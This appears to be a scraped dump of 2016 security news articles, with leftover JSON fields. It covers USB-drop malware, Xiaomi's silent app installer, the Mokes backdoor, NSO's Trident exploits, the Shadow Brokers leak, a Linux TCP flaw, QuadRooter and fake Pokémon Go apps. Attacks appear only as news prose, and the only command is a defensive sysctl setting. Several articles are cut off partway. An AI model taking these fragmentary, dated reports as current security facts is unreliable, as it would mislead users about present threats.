Australia's Victoria Police Force has issued a warning regarding unmarked USB flash drives containing harmful malware being dropped inside random people's letterboxes in the Melbourne suburb of Pakenham. It seems to one of the latest tactics of cyber criminals to target people by dropping malware-laden USB sticks into their mailboxes, in the hope unsuspecting users will plug the infected devices into their personal or home computers. The warning, published on the official website of the Victoria Police, one of Australia's state police departments, reads: \"Members of the public are allegedly finding unmarked USB drives in their letterboxes. Upon inserting the USB drives into their computers victims have experienced fraudulent media streaming service offers, as well as other serious issues [malware]. The USB drives are believed to be extremely harmful and members of the public are urged to avoid plugging them into their computers or other devices.\" The warning comes after a recent flood of reports from residents in the suburb of Pakenham who found compromised unmarked drives in their mailboxes and inserted them into their computers. Although the police did not provide any further detail on the type of malware on the drives or whether the victims were served ransomware demands on running the malicious code on the drives, this is no surprise to us that some people plugged in the drives into their PCs. Cyber Criminals are Leveraging Human Psychology A study conducted by a group of researchers from the University of Illinois, the University of Michigan and Google revealed that nearly half of people would not only plug a USB drive they've found on the ground into their PCs, but would also open files and click on unfamiliar links. The worst part is that people don't make this blunder unknowingly because it has long been known that USB drives can carry and transfer destructive malware and viruses to your computers, perhaps the most infamous example of it was the Stuxnet worm. The Stuxnet sabotage malware was allegedly designed by the U.S. and Israel to disrupt Iran's nuclear facility and destroyed its uranium enrichment centrifuges in 2010. The infection is believed to have been carried through an infected USB stick. Keeping this human psychology in mind, just last month a Hong Kong-based company started selling a USB stick, dubbed USB Kill v2, that can fry any computer it's plugged into. So, next time when you find any USB drive or receive it in the post, show more caution and make sure you don't plug it into your laptop or computer." }

Do you own an Android Smartphone from Xiaomi, HTC, Samsung, or OnePlus? If yes, then you must be aware that almost all smartphone manufacturers provide custom ROMs like CyanogenMod, Paranoid Android, MIUI and others with some pre-loaded themes and applications to increase the device's performance. But do you have any idea about the pre-installed apps and services your manufacturer has installed on your device?, What are their purposes? And, Do they pose any threat to your security or privacy? With the same curiosity to find answers to these questions, a Computer Science student and security enthusiast from Netherlands who own a Xiaomi Mi4 smartphone started an investigation to know the purpose of a mysterious pre-installed app, dubbed AnalyticsCore.apk, that runs 24x7 in the background and reappeared even if you delete it. Xiaomi is one of the world's largest smartphone manufacturers, which has previously been criticized for spreading malware, shipping handsets with pre-loaded spyware/adware and forked version of Android OS, and secretly stealing users' data from the device without their permission. Xiaomi Can Silently Install Any App On your Device After asking about the purpose of AnalyticsCore app on company’s support forum and getting no response, Thijs Broenink reverse engineered the code and found that the app checks for a new update from the company's official server every 24 hours. While making these requests, the app sends device identification information with it, including phone's IMEI, Model, MAC address, Nonce, Package name as well as signature. If there is an updated app available on the server with the filename \"Analytics.apk,\" it will automatically get downloaded and installed in the background without user interaction. \"I couldn't find any proof inside the Analytics app itself, so I am guessing that a higher privileged Xiaomi app runs the installation in the background,\" Broenink says in his blog post. Now the question is, Does your phone verify the correctness of the APK, and does it make sure that it is actually an Analytics app? Broenink found that there is no validation at all to check which APK is getting installed to user's phone, which means there is a way for hackers to exploit this loophole. This also means Xiaomi can remotely and silently install any application on your device just by renaming it to \"Analytics.apk\" and hosting it on the server. \"So it looks like Xiaomi can replace any (signed?) package they want silently on your device within 24 hours. And I’m not sure when this App Installer gets called, but I wonder if it’s possible to place your own Analytics.apk inside the correct dir, and wait for it to get installed,\" Broenink said. Hackers Can Also Exploit This Backdoor Since the researcher didn't find the actual purpose of the AnalyticsCore app, neither on Googling nor on the company's website, it is hard to say why Xiaomi has kept this mysterious \"backdoor\" on its millions of devices. As I previously said: There is no such backdoor that only its creator can access. So, what if hackers or any intelligence agency figure out how to exploit this backdoor to silently push malware onto millions of Xiaomi devices within just 24 hours? Ironically, the device connects and receive updates over HTTP connection, exposing the whole process to Man-in-the-Middle attacks. \"This sounds like a vulnerability to me anyhow, since they have your IMEI and Device Model, they can install any APK for your device specifically,\" Broenink said. Even on the Xiaomi discussion forum, multiple users have shown their concerns about the existence of this mysterious APK and its purpose. \"Don't know what purpose does it serve. Even after deleting the file it reappears after some time,\" one user said. Another said, \"if I go to battery usage app, this app is always at the top. It is eating away at resources I believe.\" How to Block Secret Installation? As a temporary workaround, Xiaomi users can block all connections to Xiaomi related domains using a firewall app. No one from Xiaomi team has yet commented on its forum about the question raised by Broenink. We'll update the story as soon as we heard from the company. Meanwhile, if you are a Xiaomi user and has experienced anything fishy on your device, hit the comments below and let us know. Official Statement From Xiaomi A Xiaomi spokesperson has reached out The Hacker News with an official statement for the claims made by Thijs Broenink about a backdoor that let hackers, as well as Xiaomi itself, to secretly install any application on the millions of affected devices, saying: \"AnalyticsCore is a built-in MIUI system component that is used by MIUI components for the purpose of data analysis to help improve user experience, such as MIUI Error Analytics.\" Although the company did not deny or comment anything about its ability to automatically install any app onto your device in the background without your interaction, the spokesperson has clarified that hackers would not be able to exploit this \"self-upgrade\" feature. \"As a security measure, MIUI checks the signature of the Analytics.apk app during installation or upgrade to ensure that only the APK with the official and correct signature will be installed,\" the representative added. \"Any APK without an official signature will fail to install. As AnalyticsCore is key to ensuring better user experience, it supports a self-upgrade feature. Starting from MIUI V7.3 released in April/May, HTTPS was enabled to further secure data transfer, to prevent any man-in-the-middle attacks.\" We have further reached out Xiaomi for a comment on its ability to auto-install apps without user's interactions." }

Due to the rise in popularity of Mac OS X and other Windows desktop alternatives, hackers have begun designing cross-platform malware modularly for wide distribution.

One such malware family has recently been discovered by researchers at Kaspersky Lab, which run on all the key operating systems, including Windows, Linux, and Mac OS X. Stefan Ortloff, a researcher from Kaspersky Lab’s Global Research and Analysis Team, first discovered the Linux and Windows variants of this family of cross-platform backdoor, dubbed Mokes, in January this year. Now, the researcher today confirmed the existence of an OS X variant of this malware family, explaining a technical breakdown of the backdoor in a post on Securelist. Alike the Linux and Windows variants, the OS X backdoor variant, Backdoor.OSX.Mokes.a, specializes in capturing audio-video, obtaining keystrokes as well as taking screenshots every 30 seconds from a victim’s machine. The variant is written in C++ using Qt, a cross-platform application framework that is widely being used for developing applications to run on various software and hardware platforms. The backdoor also has the capability to monitor removable storage like when a USB drive is connected to or removed from the computer. It can also scan the file system for Office documents, including .docx, .doc, .xlsx, and .xls files. The OS X backdoor can also execute arbitrary commands on the victim’s computer from its command and control (C&C) server. The backdoor establishes an encrypted connection with its command and control server and communicates using AES-256 encryption, which is considered to be a secure encryption algorithm. Ortloff notes, right after execution, the OS X sample he analyzed copies itself to a handful of locations, including caches that belong to Skype, Dropbox, Google, and Firefox. This behavior is similar to the Linux variant that copied itself to locations belonging to Dropbox and Firefox after execution. The researcher has not attributed the Mokes backdoor family to any hacking group, state-sponsored hacker or country, nor he detailed about the OS X backdoor’s infection vector and how widespread it is. However, based on the currently available information, the backdoor seems to be a sophisticated piece of malware." }

Donald Ryan Austin, a 27-year-old programmer from of El Portal, Florida, was charged Thursday with hacking servers belonging to the Linux Kernel Organization (kernel.org) and the Linux Foundation in 2011, the Department of Justice announced on Thursday. The Linux Kernel Organization runs kernel.org servers for distributing the Linux operating system kernel, which is the heart of the operating system, whereas the Linux Foundation is a separate group that supports kernel.org. According to an indictment [PDF] unsealed by federal prosecutors on Monday, Austin managed to steal login credentials of one of the Linux Kernel Organization system administrators in 2011 and used them to install a hard-to-detect malware backdoor, dubbed Phalanx, on servers belonging to the organization. But what made the breach much significant? It's the open-source operating system that's being used by Millions of corporate and government networks worldwide. Using the Phalanx malware, Austin allegedly installed Ebury – a Trojan designed for Linux, FreeBSD or Solaris hacking – on a number of servers run by the Linux groups, which helped him gain access to the login credentials of people using the servers. Austin allegedly infected Linux servers, including \"Odin1,\" \"Zeus1,\" and \"Pub3,\" which were leased by the Linux Foundation for operating kernel.org. He also hacked the personal email server of Linux Kernel Organization’s founder Peter Anvin. Austin is also accused of allegedly using his unauthorized admin privileges to insert messages into the system that would display when the servers restarted. According to prosecutors, Austin's motive for the intrusion was to gain early access to Linux software builds distributed through the www.kernel.org website. Bad Luck! Hacker Arrested while Breaking Traffic Rules This security breach forced the Linux Foundation to shut down kernel.org completely while a malware infection was cleared up, and rebuild several of its servers. Miami Shores Police stopped Austin while breaking traffic rules on August 28 and then arrested after identified as a suspect in 2011 case. Austin is charged with 4 counts of \"intentional transmission causing damage to a protected computer.\" He was released from jail on a bond of $50,000 provided by the family of his girlfriend. Judge has ordered Austin to stay away from the Internet, computers, and every type of social media or e-mail services, due to his \"substance abuse history.\" Austin is scheduled to appear in San Francisco federal court on September 21 before the Honorable Sallie Kim, and if found guilty, he faces a possible sentence of 40 years in prison as well as $2 Million in fines." }

One of the world's most invasive software weapon distributors, called the NSO Group, has been exploiting three zero-day security vulnerabilities in order to spy on dissidents and journalists. The NSO Group is an Israeli firm that sells spying and surveillance software that secretly tracks a target's mobile phone. The zero-day exploits have allowed the company to develop sophisticated spyware tools that can access the device location, contacts, texts, calls logs, emails and even microphone. Apple fixed these three vulnerabilities within ten days after being informed by two security firms, Citizen Lab and Lookout, who conducted a joint investigation. Background Story: Malware Discovery Mansoor, 46, ‘Martin Ennals Award’ winner from the United Arab Emirates, received a text message on his iPhone on August 10, from an unknown number. Mansoor found the message suspicious and knowing that government hackers had already targeted him in the past, he forwarded that message directly to Citizen Lab researcher Bill Marczak. Citizen Lab brought in Lookout, a San Francisco mobile security company, to help examine the message. After analyzing the message content, the researchers found that the link led to a sophisticated piece of malware that exploited three different unknown flaws in Apple’s iOS that would have allowed the attackers to get complete control of Mansoor’s iPhone. Those links, if clicked, \"Mansoor’s iPhone would have been turned into a sophisticated bugging device controlled by UAE security agencies,\" the Citizen Lab explained in a blog post. \"They would have been able to turn on his iPhone’s camera and microphone to record Mansoor and anything nearby, without him being wise about it. They would have been able to log his emails and calls — even those that are encrypted end-to-end. And, of course, they would have been able to track his precise whereabouts.\" According to a blog post published by Lookout, the three zero-day flaws, dubbed \"Trident\" by the firm, involved: A memory corruption vulnerability in WebKit that could allow hackers to exploit a device when a user clicks on a malicious link. Two kernel bugs (allowing device jailbreak) that an attacker secretly installs malware on victim’s device to carry out surveillance. Apple released the patch update, iOS 9.3.5, on Thursday, and labeled it \"important,\" advising its users to install the latest version of iOS as soon as possible to protect their devices against these potential security exploits.

An unknown hacker or a group of hackers just claimed to have hacked into \"Equation Group\" -- a cyber-attack group allegedly associated with the United States intelligence organization NSA -- and dumped a bunch of its hacking tools (malware, private exploits, and hacking tools) online. I know, it is really hard to believe, but some cybersecurity experts who have been examining the leak data, exploits and hacking tools, believe it to be legitimate. Hacker Demands $568 Million in Bitcoin to Leak All Tools and Data Not just this, the hackers, calling themselves \"The Shadow Brokers,\" are also asking for 1 Million Bitcoins (around $568 Million) in an auction to release the 'best' cyber weapons and more files.

Equation Group was also linked to the previous infamous Regin and Stuxnet attacks, allegedly the United States sponsored hacks, though the link was never absolutely proven. Two days back, The Shadow Brokers released some files, which it claimed came from the Equation Group, on Github (deleted) and Tumblr. Exploits for American & Chinese Firewalls Leaked: The files mostly contained installation scripts, configurations for command-and-control (C&C) servers, and exploits allegedly designed to target routers and firewalls from American manufacturers including, Cisco, Juniper, and Fortinet. According to the leaked files, Chinese company 'Topsec' was also an Equation Group target. The leak mentioned names of some of the hacking tools that correlate with names used in the documents leaked by whistleblower Edward Snowden, like \"BANANAGLEE\" and \"EPICBANANA.\" \"We follow Equation Group traffic,\" says the Shadow Broker. \"We find Equation Group source range.

The Transmission Control Protocol (TCP) implementation in all Linux systems deployed since 2012 (version 3.6 and above of the Linux kernel) poses a serious threat to Internet users, whether or not they use Linux directly. This issue is troubling because Linux is used widely across the Internet, from web servers to Android smartphones, tablets, and smart TVs. Researchers have uncovered a serious Internet flaw, which if exploited, could allow attackers to terminate or inject malware into unencrypted communication between any two vulnerable machines on the Internet. The vulnerability could also be used to forcefully terminate HTTPS encrypted connections and downgrade the privacy of secure connections, as well as also threatens anonymity of Tor users by routing them to certain malicious relays. The flaw actually resides in the design and implementation of the Request for Comments: 5961 (RFC 5961) – a relatively new Internet standard that's designed to make commonly used TCP more robust against hacking attacks. TCP protocol is the heart of all Internet communications, as all application level protocols, including HTTP, FTP, SSH, Telnet, DNS, and SMTP, stand on TCP. Web servers and other applications make use of TCP protocol to establish connections between hosts to transfer data between them. A team of six security researchers from the University of California, Riverside and the U.S. Army Research Laboratory has demonstrated a proof-of-concept exploit at the USENIX Security Symposium that can be used to detect if two hosts are communicating over TCP and ultimately attack that traffic. No Need of Man-in-the-Attack PositionTypically, TCP protocol assembles messages into a series of data packets that are identified by unique sequence numbers and transmitted to the receiver. When received, the data packets are then reassembled by the receiver into the original message. Researchers found that 'Side channels' attack allows hackers to guess the TCP packet sequence numbers accurately within first 10 seconds of the attack by using no more information than just the IP addresses of both parties. This means, an attacker with spoofed IP address does not need a man-in-the-middle (MITM) position, apparently intercepting and injecting malicious TCP packets between any two arbitrary machines on the Internet. The researchers detailed their findings in the paper titled, 'Off-Path TCP Exploits: Global Rate Limit Considered Dangerous' [PDF], which they presented at the conference, showing the audience how they injected a phishing form inside the USA Today website. You can watch the video demonstration above that shows the attack in work. Targeting the Tor Network The researchers also show how the flaw (CVE-2016-5696) can be exploited to break Secure Shell (SSH) connections and tamper with encrypted communications traveling over Tor anonymity network. \"In general, we believe that a DoS [Denial of Service] attack against Tor connections can have a devastating impact on both the availability of the service as a whole and the privacy guarantees that it can provide,\" the paper reads. \"The default policy in Tor is that if a connection is down between two relay nodes, say a middle relay and an exit relay, the middle relay will pick a different exit relay to establish the next connection. If an attacker can dictate which connections are down (via reset attacks), then the attacker can potentially force the use of certain exit relays.\"The team also provided recommendations on how to mitigate the attack. Here's How to Mitigate TCP Attack While patches to fix the vulnerability are developed and distributed for the current Linux kernel, as a workaround you can raise the ACK rate limit on your Linux machine or gadget to large values so that it cannot be reached. For this, you are required to append the following to /etc/sysctl.conf: net.ipv4.tcp_challenge_ack_limit = 999999999Once done, use sysctl -p to activate the new rule. You need to perform root to do this. The researchers also note that while Linux version 3.6 and above are vulnerable to this attack, Windows, OS X and FreeBSD are not believed to be vulnerable because they have not yet fully implemented RFC 5961." }

Microsoft has accidentally leaked the Secret keys that allow hackers to unlock devices protected by UEFI (Unified Extensible Firmware Interface) Secure Boot feature. What's even worse? It will be impossible for Microsoft to undo its leak. Secure Boot is a security feature that protects your device from certain types of malware, such as a rootkit, which can hijack your system bootloader, as well as, Secure Boot restricts you from running any non-Microsoft operating system on your device. In other words, when Secure Boot is enabled, you will only be able to boot Microsoft approved (cryptographically signature checking) operating systems. However, the Golden Keys disclosed by two security researchers, using alias MY123 and Slipstream, can be used to install non-Windows operating systems, say GNU/Linux or Android, on the devices protected by Secure Boot. Moreover, according to the blog post published by researchers, it is impossible for Microsoft to fully revoke the leaked keys, potentially giving law enforcement (such as FBI and NSA) special backdoor that can be used to unlock Windows-powered devices in criminal cases. The issue actually resides in the Secure Boot policy loading system, where a specially signed policy loads early and disables the operating system signature checks, the reg reports. This specific Secure Boot policy was created and signed by Microsoft for developers, testers, and programmers for debugging purposes. \"During the development of Windows 10 v1607 'Redstone,' MS added a new type of secure boot policy. Namely, \"supplemental\" policies that are located in the EFIESP partition…\" researcher said.\"...a backdoor, which MS put into secure boot because they decided to not let the user turn it off in certain devices, allows for secure boot to be disabled everywhere!\"Yesterday, Microsoft released August Patch Tuesday that includes a security patch for designing flaw in Secure Boot for the second time in two months, but unfortunately, the patch is not complete." }

You have seen hackers targeting your computer, smartphone, and tablet, but now, it has been proved that they can even compromise your monitor and turn them against by just changing the pixels displayed on the screen. Although changing pixels is really hard and complicated, a team of security researchers at this year’s DEF CON says that it is not impossible. Ang Cui and Jatin Kataria of Red Balloon Security has demonstrated a way to hack directly into the computer that controls monitor to see the pixels displayed on the monitor as well as manipulate the pixels in order to display different images. How to Hack Computer Monitors? According to the researchers, an attacker first needs to gain physical access to the monitor's USB or HDMI port which would then help the attacker access the firmware of the display. The duo said they discovered the hack by reverse-engineering a Dell U2410 monitor, though it was not an easy process, as it took over two years. In the process, the pair found out that Dell had not implemented any security measures with regard to the process to update the display controller’s firmware, which allowed for this hack. This means that anyone with malicious intent and access to the monitor’s USB or HDMI port would be able to hijack monitor — which involves injecting malicious firmware with the help of a drive-by attack — as well as manipulate the on-screen pixels. The researchers developed a working exploit, saying \"We can now hack the monitor and you shouldn’t have blind trust in those pixels coming out of your monitor.\" How Dangerous could the Monitor Hack possibly be? Changing a single button could cause a huge amount of damage to the nation. The team gave an example by changing the status-alert light on the control interface of a power plant from Green to Red, which could trick someone into shutting down the power plant. During their presentation, Cui and Kataria were also able to inject a photo onto a display and add a secure lock icon to the address field of a Web browser. In one example, the team even demonstrated the ability to change PayPal balance from $0 to $1,000,000,000. So, hackers do not require to infect your computer with a ransomware infection. If they can hack your monitor, they can manipulate the pixels to display a ransomware message permanently on your screen, demanding payment to remove the message. This could be a new strain of computer-based Ransoming. What's even Worse? The hacker could log the pixels generated by the monitor and effectively spy on the target users. The pair warns that this issue does not limit to just Dell monitors, but also potentially affects one Billion monitors all over the world, given that all of the most common brands have vulnerable processors. However, there's a downside to this attack. This type of attack is pretty easy to detect, as the image on a screen does not load nearly as fast as it would have before being infected. So it's possibly not the most efficient way to manipulate things quickly on the computers of victims, who are sitting in front of their computers all the time. But what about industrial control systems monitors, whose displays are mostly static? Well, if hackers target industrial control console, the attack might be a lot harder to detect. So, stop trusting your monitors, peeps! Those interested in checking out the code behind the technique can do so by clicking here." }

Until now we have heard many scary stories of hacking IoT devices, but how realistic is the threat? Just think of a scenario where you enter in your house, and it's sweltering, but when you head on to check the temperature of your thermostat, you find out that it has been locked to 99 degrees. And guess what? Your room thermostat is demanding $300 in Bitcoins to regain its control. Congratulations, Your Thermostat has been Hacked! This is not just a hypothetical scenario; this is exactly what Ken Munro and Andrew Tierney of UK-based security firm Pen Test Partners have demonstrated at the DEFCON 24 security conference in Las Vegas last Saturday. Two white hat hackers recently showed off the first proof-of-concept (PoC) ransomware that infects a smart thermostat. Ransomware is an infamous piece of malware that has been known for locking up computer files and then demanding a ransom, usually in Bitcoins, in order to unlock them. But, over time the threat has changed its way to the mobile world, infecting smartphones, and even smart TVs. The hackers chose a US thermostat with a large LCD display that runs a modified version of Linux, and has an SD card slot to allow its users to load custom settings or wallpapers, which they said, \"makes it so easy to hack.\" The duo found that the thermostat did not really check the files running and executing on it, which allowed them to load malware into the thermostat, locking the screen and showing a classic ransom note. \"So we put in a huge executable by loading a 7MB Javascript file, but this is not plain Javascript so you can query the SQL database so it can execute Linux commands,\" Tierney told Infosecurity Magazine. \"It heats to 99 degrees, and asks for a PIN to unlock which changes every 30 seconds. We put an IRC botnet on it, and the executable dials into the channel and uses the MAC address as the identifier, and you need to pay one Bitcoin to unlock.\"Since every process inside the thermostat application runs with root privileges, a malicious hacker does not require any special privilege escalation vulnerabilities to compromise the device. The researchers took advantage of a vulnerability in the particular thermostat's system, but they declined to publicly disclose it, since they have not got a chance to file a bug report with the thermostat manufacturer and get it fixed yet. However, the two plan to report the bug today, on Monday. They also said the patch should be easy to deploy. The downside, though, is that installing the ransomware, currently, requires the hackers to either have physical access to the thermostat or trick the victim into loading malicious files on the device on his own. Since Internet of Things is currently being deployed in a large variety of uses throughout your home, businesses, hospitals, and even entire cities that are called Smart Cities, it gives attackers a large number of entry points to affect you some or the other way. But, if deployed securely, it could do miracles… even save your life. Tesla Autopilot Saved a Life Just take a recent example of Tesla smart car. Tesla Model X owner, 37-year-old attorney Joshua Neally, claimed the car's Autopilot feature (self-driving mode) got him to the hospital during a medical emergency. However, the downside of such self-driven technology is that it can be hacked by crooks and we can not ignore them because we have seen a number of smart car hacking incidents in the past. Previous research demonstrated hackers capabilities to hijack smart cars remotely and control its steering, brakes, and transmission, and even disable car's crucial functions like airbags by exploiting security flaws affecting significant automobiles. The bottom line: Being cyber savvy could let you enjoy the new world of connected devices while helping you stay safe online." }

Over 900 Million Android Phones Vulnerable to New 'QuadRooter' Attack", "Address" : "https://thehackernews.com/2016/08/hack-android-phone.html", "Date" : "2016-08-07T20:06:00-11:00", "Article" : "Android has Fallen! Yet another set of Android security vulnerabilities has been discovered in Qualcomm chipsets that affect more than 900 Million Android smartphones and tablets worldwide. What's even worse: Most of those affected Android devices will probably never be patched. Dubbed \"Quadrooter,\" the set of four vulnerabilities discovered in devices running Android Marshmallow and earlier that ship with Qualcomm chip could allow an attacker to gain root-level access to any Qualcomm device. The chip, according to the latest statistics, is found in more than 900 Million Android tablets and smartphones. That's a very big number. The vulnerabilities have been disclosed by a team of Check Point researchers at the DEF CON 24 security conference in Las Vegas. Critical Quadrooter Vulnerabilities: The four security vulnerabilities are: CVE-2016-2503 discovered in Qualcomm's GPU driver and fixed in Google's Android Security Bulletin for July 2016. CVE-2016-2504 found in Qualcomm GPU driver and fixed in Google's Android Security Bulletin for August 2016. CVE-2016-2059 found in Qualcomm kernel module and fixed in April, though patch status is unknown. CVE-2016-5340 presented in Qualcomm GPU driver and fixed, but patch status unknown. Qualcomm is the world's leading designer of LTE (Long Term Evolution) chipsets with a 65% share of the LTE modem baseband market. If any one of the four flaws is exploited, an attacker can trigger privilege escalations for gaining root access to an affected device. All an attacker needs is to write a piece of malware and send it to the victim. When installed, the malware offers the attacker privilege escalation on the affected devices. According to the researchers, the attack can also be conducted through a malicious app. An attacker needs to trick a user into installing a malicious app that, unlike other malware, would execute without requiring any special permission checks. \"Such an app would require no special permissions to take advantage of these vulnerabilities, alleviating any suspicion users may have when installing,\" Check Point researchers write in a blog post. If any of the four vulnerabilities are successfully exploited, an attacker could gain root access to an affected device, giving the attacker full access to the device, including its data, camera and microphone. List of Affected Devices (Popular) More than 900 Million Android devices that ship with Qualcomm chip are vulnerable to the flaws. Here's the list of some of the popular affected devices, though there are far more devices that are impacted by one or more Quadrooter vulnerabilities. Samsung Galaxy S7 and Samsung S7 Edge Sony Xperia Z Ultra OnePlus One, OnePlus 2 and OnePlus 3 Google Nexus 5X, Nexus 6 and Nexus 6P Blackphone 1 and Blackphone 2 HTC One, HTC M9 and HTC 10 LG G4, LG G5, and LG V10 New Moto X by Motorola BlackBerry Priv How to Check if Your Device is Vulnerable? You can check if your smartphone or tablet is vulnerable to Quadrooter attack using Check Point's free app. Since the vulnerable software drivers, which control communication between Qualcomm chipset components, come pre-installed on these devices at the time of manufacturing, they can only be fixed by installing a patch from the devices' distributors or carriers after receiving fixed driver packs from Qualcomm. \"This situation highlights the inherent risks in the Android security model,\" the researchers say. \"Critical security updates must pass through the entire supply chain before they can be made available to end users.\" Three of the four vulnerabilities have already been fixed in Google's latest set of monthly security updates, and a patch for the remaining flaw will be rolled out in the upcoming September update. Since Qualcomm has already released the code, the phone manufacturers could be able to issue patches to the individual devices as soon as possible. Android Nexus devices are already patched via the over-the-air updates, but other smartphone models will need to wait until their lazy phone manufacturers integrate the fixes into their own custom Android ROMs." }

Android Nougat 7.0 Getting Strictly Enforced 'Verified Boot' In Android Nougat, Google has taken the security of its Android operating system to the next level by strictly enforcing verified boot on devices. Among multiple layers of security protection, Android uses verified boot - since Android version 4.4 KitKat - that improves its device's security by using cryptographic integrity checking to detect if your device has been tampered with. Now, Android Nougat will strictly enforce the boot check, giving you far more than just a warning. 2. Android 7.0 Verified Boot Protects Device from Rootkits and Malware Enforcing verified boot on a device is a good idea. If any Android malware or rootkit made its way onto your Android device and made deep system changes to critical kernel files, your device will either start in a limited-use mode (presumably similar to safe mode) or refuse to start at all, protecting your data. In addition to strict verified boot, Android Nougat also features forward error correction that is capable of repairing some errors on devices without any user input. And, of course, Nexus devices will be the first to get these features. This will prevent your Android device from becoming a playground for malware and viruses, at least after you restart it. That sounds really great. Right? 3. If Modified, Corrupt or Tampered, It won't let your phone Boot For most users the strict verified boot would be helpful, however, for some, it's bad news. According to Google, some non-malicious corruption of data could cause Android devices to fail to boot up because verified boot process runs into issues that it can not correct. This data corruption could be the result of some software flaws or hardware issues. Here's what the Android Developer blog explains: \"This means that a device with a corrupt boot image or verified partition will not boot or will boot in a limited capacity with user consent. Such strict checking, though, means that non-malicious data corruption, which previously would be less visible, could now start affecting process functionality more.\" Since corrupted data may not always be malicious, even a single-byte error could prevent the device from booting. However, Android Nougat brings additional code designed to protect against data corruption. \"In the changes we made to dm-verity for Android 7.0, we used a technique called interleaving to allow us to recover not only from a loss of an entire 4 KiB source block, reads the blog, \"but several consecutive blocks, while significantly reducing the space overhead required to achieve usable error correction capabilities compared to the naive implementation.\" 4. Verified Boot Has Made It Harder to Root Android 7.0 Nougat Like I said, data corruption could not always be due to malicious reasons. Strictly enforcing verified boot could also make it tougher for you to tweak your Android Operating System (especially with locked bootloader) using custom ROMs, mods, and kernels. Since this involves circumventing the locked bootloader, verified boot process will detect any changes, making it harder for users to play with their devices when Nougat rolls around. The bottom line: Enforcing strict verified boot in Android Nougat is a good idea, because most users root their devices with custom firmware but forget to take important security measures, which leaves their devices open to malicious software and rootkits. What do you think of the additional security Google provides to the boot process in Android Nougat? Let us know your views in the comments below!" }

Researchers from SentinelOne Labs discovered the malware, which has already infected at least one European energy company, is so sneaky and advanced that it is likely believed to be the work of a wealthy nation. The malware, dubbed 'SFG', contains about 280 kilobytes of code, featuring a vast arsenal of tools rarely seen in ordinary malware samples. It takes \"extreme measures\" to cleverly and stealthily evade a large number of security defenses before it drops its payload. The malware dismantles antiviruses processes one-by-one until the malware is finally safe to uninstall them all. It also encrypts key features of its code so that it could not be discovered and analyzed. It'll not execute itself if it senses it's being run in a sandbox environment. The Windows-based malware even takes special care of features such as facial recognition, fingerprint scanners, and other advanced biometric access control systems running inside target organizations. To gain administrative access to the infected computer, the malware sample uses a pair of privilege escalation exploits for Windows flaws (CVE-2014-4113 and CVE-2015-1701) that were patched by Microsoft in October 2014 and May 2015, respectively. SentinelOne Chief Security Officer Udi Shamir says: \"The malware has all the hallmarks of a nation-state attack due to its extremely high level of sophistication and the cost associated with creating software of this advanced nature.\" Once it has gained administrative control of a computer, the malware surveys the connected network, reports information about the infected network back to its operators, and await further instructions, giving attackers a network backdoor on targeted industrial control systems. The backdoor could then be used to install other malware on systems for more detailed espionage or \"extract data or potentially shut down the energy grid,\" security researchers warn. The SFG malware is related to an earlier malware sample dubbed Furtim – another piece of highly sophisticated malware that was uncovered in May – that's also able to evade antivirus and other security defenses. The amount of time, efforts, and resources required to create the malware means that it is the work of a team of hackers working for a wealthy nation government, though the researchers didn't reveal the nation behind the attack. \"It appears to be the work of multiple developers who've reverse engineered more than a dozen antivirus solutions and gone to extreme lengths to evade detection, including causing the [antivirus] software to stop working without the user being alerted,\" Shamir wrote says. \"Attacks of this nature require substantial funding and knowhow to pull off and are likely to be the result of a state-sponsored attack, rather than a cybercriminal group.\" You can find more technical details about the SFG malware in a report published by the security firm SentinelOne on Tuesday." }

It Could be Malicious...", "Address" : "https://thehackernews.com/2016/07/download-pokemon-go-android-iphone.html", "Date" : "2016-07-10T23:12:00-11:00", "Article" : "\"Pokémon Go\" has become the hottest iPhone and Android game to hit the market in forever with enormous popularity and massive social impact. The app has taken the world by storm since its launch this week. Nintendo's new location-based augmented reality game allows players to catch Pokémon in the real life using their device's camera and is currently only officially available in the United States, New Zealand, UK and Australia. On an average, users are spending twice the amount of time engaged with the new Pokémon Go app than on apps like Snapchat. In fact Pokémon Go is experiencing massive server overload in just few days of launch. Due to the huge interest surrounding Pokémon Go, many gaming and tutorial websites have offered tutorials recommending users to download the APK from a non-Google Play link. In order to download the APK, users are required to \"side-load\" the malicious app by modifying their Android core security settings, allowing their device's OS to install apps from \"untrusted sources.\" Pokémon Go is Installing DroidJack Malware Security researchers have warned users that many of these online tutorials are linked to malicious versions of the Pokémon Go app that install a backdoor on Android phones, enabling hackers to compromise a user's device completely. Security firm Proofpoint has discovered the malicious app, or APK, that has been infected with DroidJack – a Remote Access Tool (RAT) that can hack any Android device by opening a silent backdoor for hackers. Just less than 3 days after Nintendo initially released the game in Australia and New Zealand on July 4, the malicious app was uploaded to an online malware detection repository. Since Android core security settings normally prevent the installation of untrusted third-party apps from \"unknown sources,\" side-loading should have never been done by a user. \"This is an extremely risky practice and can easily lead users to install malicious apps on their own mobile devices,\" researchers at Proofpoint wrote in a blog post. \"Should an individual download an APK [Android application package] from a third-party that has been infected with a backdoor, like the one we discovered, their device would then be compromised.\" Here's How to Prevent Yourself Fortunately, there are several ways to check if you have downloaded the malicious version of the Pokémon Go app. The infected version of the Pokémon Go app would have been granted more system permissions, so one way to differ between the two is to compare the permissions of your app to those of the legitimate one. To do so, Go to the Settings → Apps → Pokemon GO and check the game's permissions. If you find that the game has asked for permissions like directly call phone numbers, edit and read your SMSes, record audio, read Web history, modify and read your contacts, read and write call logs, and change network connectivity, then you should uninstall the game right away, since it is infected with DroidJack. You can also compare the game's SHA-1 hash – a long string of characters used to verify if a file was infected with or modified by a malicious third-party – to make sure the game matches the hash of the legitimate version. The Bottom Line: Instead of downloading available applications from unknown third party stores, wait for the Pokémon Go app to launch in your country. However, downloading apps from third parties do not always end up with malware or viruses, but it certainly ups the risk. So, it's the best way to wait in order to avoid compromising your device and the networks it accesses." }

